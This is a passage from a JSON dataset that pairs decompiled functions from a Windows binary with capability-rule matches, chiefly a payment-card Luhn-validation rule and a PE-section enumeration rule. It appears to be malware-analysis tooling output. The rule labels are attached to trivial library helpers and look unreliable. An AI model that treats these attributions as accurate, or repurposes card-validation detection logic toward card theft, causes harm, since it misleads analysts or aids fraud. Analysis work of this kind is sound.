iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[5] != arg_ch[5]) {\n                        iVar3 = (arg_8h[5] & 0xff) - *(arg_ch + 5);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 0x15) - *(arg_ch + 0x15),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 0x16) - *(arg_ch + 0x16),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 0x17) - *(arg_ch + 0x17);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[6] != arg_ch[6]) {\n                        iVar3 = (arg_8h[6] & 0xff) - *(arg_ch + 6);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 0x19) - *(arg_ch + 0x19),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 0x1a) - *(arg_ch + 0x1a),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 0x1b) - *(arg_ch + 0x1b);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[7] != arg_ch[7]) {\n                        iVar3 = (arg_8h[7] & 0xff) - *(arg_ch + 7);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 0x1d) - *(arg_ch + 0x1d),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 0x1e) - *(arg_ch + 0x1e),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 0x1f) - *(arg_ch + 0x1f);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    arg_10h = arg_10h - 0x20;\n                    arg_8h = arg_8h + 8;\n                    arg_ch = arg_ch + 8;\n                } while (0x1f < arg_10h);\n            }\n    // WARNING: Could not recover jumptable at 0x00486c13. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (32 cases) at 0x48775d\n            iVar3 = (**(arg_10h * 4 + 0x48775d))();\n            return iVar3;\n        }\n        iVar3 = *arg_8h - *arg_ch;\n        if (((iVar3 != 0) || (iVar3 = *(arg_8h + 1) - *(arg_ch + 1),  iVar3 != 0)) ||\n           (iVar3 = *(arg_8h + 2) - *(arg_ch + 2),  iVar3 != 0)) {\ncode_r0x004876d7:\n            return (0 < iVar3) * 2 + -1;\n        }\n        uVar2 = *(arg_8h + 3);\n        uVar1 = *(arg_ch + 3);\n    }\n    iVar3 = uVar2 - uVar1;\n    if (iVar3 != 0) {\n        iVar3 = (0 < iVar3) * 2 + -1;\n    }\n    return iVar3;\n}\n",
        "token_count": 2327
    },
    "0040213f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.0040213f(int16_t *arg_8h, int16_t *arg_ch, int16_t *arg_10h)\n\n{\n    if (arg_8h != arg_ch) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                return arg_8h;\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 115
    },
    "00402162": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint16_t __cdecl fcn.00402162(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h & 0xffff;\n    if (var_8h != 0xffff) {\n        if (var_8h < 0x100) {\n            return *(*0x571e58 + var_8h * 2) & arg_ch;\n        }\n        var_4h = 0;\n        iVar1 = fcn.00405475(1, &var_8h, 1, &var_4h);\n        if (iVar1 != 0) {\n            return var_4h & arg_ch;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 191
    },
    "004021e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004021e4(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00401474(arg_8h);\n    uVar1 = fcn.00405182(uVar1);\n    fcn.004029f5(arg_8h, uVar1);\n    return;\n}\n",
        "token_count": 91
    },
    "004021e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.004021e9(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00402dce(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "00402202": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00402202(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402b26();\n    return iVar1 + 0x10;\n}\n",
        "token_count": 44
    },
    "004022a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004022a7(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.004064f6(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 225
    },
    "004022b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004022b1(uint arg_8h)\n\n{\n    fcn.00403b02();\n    return;\n}\n",
        "token_count": 31
    },
    "004022f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004022f2(uint8_t *arg_8h, int32_t **arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    bool bVar4;\n    \n    piVar2 = *arg_ch;\n    uVar3 = *arg_8h;\n    if (*(uVar3 + piVar2[0x25]) != 'e') {\n        do {\n            uVar3 = arg_8h[1];\n            arg_8h = arg_8h + 1;\n        } while ((*(*piVar2 + uVar3 * 2) & 4) != 0);\n    }\n    if (*(uVar3 + piVar2[0x25]) == 'x') {\n        uVar3 = arg_8h[2];\n        arg_8h = arg_8h + 2;\n    }\n    *arg_8h = **piVar2[0x22];\n    do {\n        arg_8h = arg_8h + 1;\n        uVar1 = *arg_8h;\n        *arg_8h = uVar3;\n        bVar4 = uVar3 != 0;\n        uVar3 = uVar1;\n    } while (bVar4);\n    return;\n}\n",
        "token_count": 291
    },
    "0040231a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040231a(uint arg_8h)\n\n{\n    fcn.00403b02(0, 0x40f11480);\n    return *0x546d94;\n}\n",
        "token_count": 48
    },
    "0040233d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040233d(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401cda(arg_8h, 1);\n    *in_ECX = vtable.std::bad_alloc.0;\n    return;\n}\n",
        "token_count": 75
    },
    "00402342": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00402342(uint arg_8h)\n\n{\n    uint var_1h;\n    \n    return arg_8h;\n}\n",
        "token_count": 49
    },
    "00402397": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402397(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    return arg_8h;\n}\n",
        "token_count": 33
    },
    "0040239c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __fastcall fcn.0040239c(uint param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403b02(param_1);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    return;\n}\n",
        "token_count": 91
    },
    "004023bf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004023bf(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    fcn.00404246();\n    iVar1 = fcn.0040629e(in_ECX + 8, arg_8h);\n    if (iVar1 == 0) {\n        *(in_ECX + 0x14) = 1;\n        iVar1 = 0;\n        *(in_ECX + 0xc) = arg_8h;\n    }\n    else {\n        *(in_ECX + 0xc) = 0;\n        *(in_ECX + 0x14) = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 156
    },
    "004023f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004023f6(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004b455e(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "00402419": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00402419(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.004c65b4(arg_8h, arg_ch, &var_1h, arg_10h);\n    return;\n}\n",
        "token_count": 83
    },
    "0040244b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040244b(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040638e(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "00402455": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402455(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00402207(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n    return;\n}\n",
        "token_count": 76
    },
    "0040248c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040248c(uint arg_8h)\n\n{\n    fcn.00403b02(&stack0x00000024);\n    fcn.00403b02();\n    return *0x546e24;\n}\n",
        "token_count": 54
    },
    "004024aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004024aa(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.004035b7(arg_10h_00 + arg_8h, arg_ch_00, 0x7ffffffe);\n        arg_8h_00 = fcn.00404480(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 8) {\n            fcn.00401d93(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h, arg_18h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.00401d93(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h, arg_18h);\n            fcn.00401654(arg_ch_01, arg_ch_00 * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.0040393b();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 438
    },
    "004024e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004024e6(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = arg_8h;\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    fcn.0040114f(arg_8h, piVar2 - (arg_8h + 1) >> 1);\n    return;\n}\n",
        "token_count": 116
    },
    "004024eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004024eb(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.00403387(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 193
    },
    "00402527": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402527(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar1 = fcn.00401bcc(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 227
    },
    "0040254f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040254f(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00404dc2(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "0040257c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040257c(void)\n\n{\n    uint arg_8h;\n    int32_t *piVar1;\n    uint *puVar2;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.0040641a();\n    var_8h = fcn.00403f26(arg_8h);\n    var_10h = 0x10;\n    piVar1 = fcn.00405e34(&var_8h, &var_10h);\n    var_ch = *piVar1;\n    var_14h = var_ch + -1;\n    var_18h = fcn.00401dfc();\n    puVar2 = fcn.004029dc(&var_18h, &var_14h);\n    return *puVar2;\n}\n",
        "token_count": 213
    },
    "004025b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004025b8(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint *puVar1;\n    uint *puVar2;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00402d5b(arg_8h);\n    puVar1 = fcn.004034db(arg_8h_00);\n    puVar2 = fcn.004010c8(arg_ch);\n    *puVar1 = *puVar2;\n    return;\n}\n",
        "token_count": 122
    },
    "004025bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.004025bd(uint arg_8h)\n\n{\n    fcn.00403b02();\n    fcn.00403b02();\n    return *0x547334;\n}\n",
        "token_count": 45
    },
    "004025cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.004025cc(int32_t param_1)\n\n{\n    *(param_1 + 0x3c) = 1;\n    fcn.004016ae(*(param_1 + 0x32), param_1 + 0x18);\n    return 1;\n}\n",
        "token_count": 66
    },
    "00402621": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402621(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00401e06();\n    return iVar1 + arg_8h;\n}\n",
        "token_count": 59
    },
    "0040264e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040264e(uint *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = 0;\n    *(param_1 + 1) = 0;\n    return;\n}\n",
        "token_count": 52
    },
    "00402685": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00402685(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    if ((param_4 | param_2) == 0) {\n        return param_1 * param_3;\n    }\n    return param_1 * param_3 & 0xffffffff | (param_1 * param_3 >> 0x20) + param_2 * param_3 + param_1 * param_4 << 0x20;\n}\n",
        "token_count": 118
    },
    "0040275c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040275c(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0;\n    uStack40 = 0;\n    for (; uVar1 = *arg_ch,  uVar1 != 0; arg_ch = arg_ch + 1) {\n        puVar2 = &uStack40 + (uVar1 >> 3);\n        *puVar2 = *puVar2 | '\\x01' << (uVar1 & 7);\n    }\n    iVar3 = -1;\n    do {\n        iVar3 = iVar3 + 1;\n        uVar1 = *arg_8h;\n        if (uVar1 == 0) {\n            return iVar3;\n        }\n        arg_8h = arg_8h + 1;\n    } while ((*(&uStack40 + (uVar1 >> 3)) >> (uVar1 & 7) & 1) == 0);\n    return iVar3;\n}\n",
        "token_count": 343
    },
    "00402784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402784(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00403526(arg_8h, arg_8h + 0x1c, &arg_ch);\n    return iVar1 - arg_8h;\n}\n",
        "token_count": 81
    },
    "00402789": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00402789(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 0x18);\n}\n",
        "token_count": 39
    },
    "004027b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004027b1(uint arg_8h)\n\n{\n    uint arg_10h;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h = fcn.00404d81();\n    fcn.004035b7(arg_8h, *(in_ECX + 0x14), arg_10h);\n    return;\n}\n",
        "token_count": 94
    },
    "004027cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004027cf(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    **(param_1 + 0x30) = **(param_1 + 0x30) + -1;\n    **(param_1 + 0x20) = **(param_1 + 0x20) + 1;\n    return;\n}\n",
        "token_count": 86
    },
    "00402801": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00402801(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    float10 in_ST0;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    fcn.00403620();\n    return in_ST0;\n}\n",
        "token_count": 111
    },
    "00402833": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402833(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.004064f6(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 190
    },
    "00402851": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402851(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00403526(arg_8h, arg_8h + 0x1a, &arg_ch);\n    return iVar1 - arg_8h;\n}\n",
        "token_count": 81
    },
    "0040296e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0040296e(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = arg_8h;\n    if (arg_8h == 0) goto code_r0x004b15c3;\n    if (arg_10h == 4) {\ncode_r0x004b15e9:\n        if ((arg_10h != 0) && (arg_10h != 0x40)) goto code_r0x004b15ff;\n    }\n    else if (arg_10h != 0) {\n        if (arg_10h != 0x40) goto code_r0x004b15c3;\n        goto code_r0x004b15e9;\n    }\n    if (0x7ffffffd < arg_14h - 2U) {\ncode_r0x004b15c3:\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0xffffffff;\n    }\ncode_r0x004b15ff:\n    var_20h = &arg_14h;\n    var_ch = arg_8h;\n    var_1ch = &var_8h;\n    var_18h = &arg_10h;\n    var_14h = &arg_ch;\n    var_10h = arg_8h;\n    uVar2 = fcn.004b13a2(&var_10h, &var_20h);\n    return uVar2;\n}\n",
        "token_count": 451
    },
    "004029c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.004029c8(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00401d61(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "004029dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.004029dc(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *var_4h;\n    \n    if (*arg_ch < *arg_8h) {\n        var_4h = arg_ch;\n    }\n    else {\n        var_4h = arg_8h;\n    }\n    return var_4h;\n}\n",
        "token_count": 89
    },
    "004029f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004029f5(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint32_t in_stack_ffffffcc;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    \n    var_18h = *(in_ECX + 0x10);\n    if (*(in_ECX + 0x14) - var_18h < arg_ch) {\n        var_10h = fcn.00405614(arg_ch, in_stack_ffffffcc & 0xffffff00 | var_20h, arg_8h, arg_ch);\n    }\n    else {\n        *(in_ECX + 0x10) = var_18h + arg_ch;\n        var_1ch = fcn.00406087();\n        fcn.00402b9e(var_1ch + var_18h, arg_8h, arg_ch);\n        var_20h._3_1_ = 0;\n        fcn.00405e0c(var_1ch + var_18h + arg_ch, &var_20h + 3);\n        var_10h = in_ECX;\n    }\n    return var_10h;\n}\n",
        "token_count": 310
    },
    "004029fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004029fa(int32_t param_1)\n\n{\n    fcn.00404179(*(param_1 + 8));\n    fcn.00404179(*(param_1 + 0x10));\n    fcn.00404179(*(param_1 + 0x14));\n    fcn.00404179(*(param_1 + 0x18));\n    return;\n}\n",
        "token_count": 88
    },
    "00402a27": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402a27(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 0xc);\n}\n",
        "token_count": 39
    },
    "00402a54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00402a54(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    fcn.00405830(arg_8h, arg_ch, arg_14h);\n    fcn.00403189(arg_14h + arg_8h, arg_1ch, arg_18h);\n    fcn.00405830(arg_14h + arg_8h + arg_18h, arg_ch + arg_14h, (arg_10h - arg_14h) + 1);\n    return;\n}\n",
        "token_count": 152
    },
    "00402a72": {
        "rules": [
